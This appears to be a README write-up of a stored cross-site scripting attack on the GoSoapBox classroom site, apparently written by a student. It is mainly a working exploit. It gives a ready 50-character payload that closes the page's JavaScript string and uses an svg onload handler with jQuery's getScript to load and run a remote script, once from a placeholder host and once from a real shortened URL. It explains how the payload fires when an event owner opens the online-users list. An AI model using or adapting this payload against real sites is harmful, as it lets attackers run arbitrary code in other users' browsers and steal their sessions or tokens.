# GoSoapBox XSS

Input in this site is rarely filtered, and on the rare occasions that it is, 
it's done poorly, and in a way that can be bypassed with minimal effort.

Just to get it out of the way, here is the actual XSS vector:
`";//<svg onload="$.getScript('//example.com/abcd')"/>`

where example.com/abcd stands for any url to a script file

To understand why this vector is used, first, some background understanding of GoSoapBox is needed.

1. GoSoapBox uses a Firebase DB to hold its information

Because of this, at the bottom of the page, there's a snippet of JS that looks like this:

```
	var user_id          = "u53r1dstr1ng";
	var user_name        = "my name";
	var firebase_path    = "https://gosoapbox-prod.firebaseio.com";
	var event_identifier = "123456789";
	var moderator_view   = 0;
	var auth_token       = "R3allyrE4llyl0ngt0k3n";
```

This js MUST be fully executed in order for the name to appear in the list of online users.

The problem is, any typical XSS vector would not show up in the list of online users,
since the given username is lazily concatenated into the javascript like so:

```
	var user_id          = "u53r1dstr1ng";
	var user_name        = "<svg onload="alert(1)"></svg>"; // Syntax error
	var firebase_path    = "https://gosoapbox-prod.firebaseio.com";
	var event_identifier = "123456789";
	var moderator_view   = 0;
	var auth_token       = "R3allyrE4llyl0ngt0k3n";
```

thus causing a syntax error.

Another problem, at least in Chrome, is that the browser automatically closes a script tag a closing script tag is found in its JS code. Because of this, the XSS vector:

`<script>alert(1)</script>`

is seen in the DOM like this:

```
<script>
	var user_id          = "u53r1dstr1ng";
	var user_name        = "<script>alert(1)
</script> <!-- Undoubtedly syntax error -->

";
	var firebase_path    = "https://gosoapbox-prod.firebaseio.com";
	var event_identifier = "123456789";
	var moderator_view   = 0;
	var auth_token       = "R3allyrE4llyl0ngt0k3n";
</script>
```

thus causing a more horrifying syntax error.

The next restriction is that

2. GoSoapBox restricts names to 50 characters

This makes writing code directly into the XSS vector infeasible, and also makes most JS hosting sites useless as well, since their URLs are far too long.

So what is the solution? URL shorteners, of course!

Not just any URL shortener can be used, however. The shortener used must both use HTTPS and have a short enough url to fit in the small input box we are given.

I, in particular, opted to use snip.li as my url shortener, though any URL shortener can be used as long as it meets the criteria.

So, to create this XSS vector, we have the following restrictions:

- No `<script>` tags
- Must be JS friendly
- 50 char limit

In order to get around these challenges, I used the following facts:

- GoSoapBox has no SOP
- It also uses jQuery
- svg onload exists

So my solution ended up being quite simple:

`";//<svg onload="$.getScript('//cutt.ly/wrqQHy3')"/>`

- The `";//` comments out the XSS vector to prevent a syntax error
- The svg onload uses `$.getScript` to retrieve an external script
- The external script is retrieved via the shortened URL `snip.li/OwO`, which points to an example script that I made.

Now, when the event owner looks at the list of online users using the "See Who's Online" button, the javascript will execute.

At this point, any normal XSS attack can be performed using the online script.

\*The XSS vector disappears after the attacking event guest logs out, making this XSS semi-persistent.

Credits:

- My teacher, for using this site 800 million times
